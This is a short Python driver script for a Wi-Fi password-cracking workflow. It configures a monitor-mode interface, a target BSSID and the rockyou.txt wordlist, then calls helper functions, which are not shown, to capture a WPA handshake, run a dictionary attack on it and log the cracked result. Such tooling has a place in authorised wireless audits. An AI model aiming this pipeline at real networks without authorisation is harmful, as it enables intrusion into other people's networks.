import os
from capture import capture_handshake
from crack import crack_password
from logger import parse_and_log

# === CONFIGURATION ===
INTERFACE = 'wlan0mon'
BSSID = '00:11:22:33:44:55'
CHANNEL = '6'
WORDLIST = 'rockyou.txt'
OUTPUT_PREFIX = 'capture'

# === SETUP ===
os.makedirs('reports', exist_ok=True)

# === MAIN ===
if __name__ == '__main__':
    capture_handshake(INTERFACE, BSSID, CHANNEL, OUTPUT_PREFIX)
    cap_file = f'captures/{OUTPUT_PREFIX}-01.cap'
    crack_output = crack_password(cap_file, WORDLIST, BSSID)
    result = parse_and_log(crack_output, BSSID)
    print(f"[*] Crack Result: {result}")
